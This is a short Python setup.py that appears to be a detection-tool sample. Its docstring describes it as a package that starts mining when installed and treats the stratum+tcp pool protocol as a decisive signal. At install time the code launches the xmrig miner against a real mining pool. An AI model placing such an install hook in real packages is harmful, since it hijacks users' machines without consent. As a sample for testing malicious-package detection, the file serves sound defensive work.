"""A package that starts mining when it is installed.

The pool protocol is the decisive part. `stratum+tcp://` exists for mining and
for nothing else, so unlike most signals in this tool it does not need a
co-signal to mean something.
"""

import subprocess

from setuptools import setup

subprocess.Popen(
    ["xmrig", "-o", "stratum+tcp://pool.minexmr.com:4444", "--donate-level", "1"]
)

setup(name="cryptominer-install", version="1.0.0")
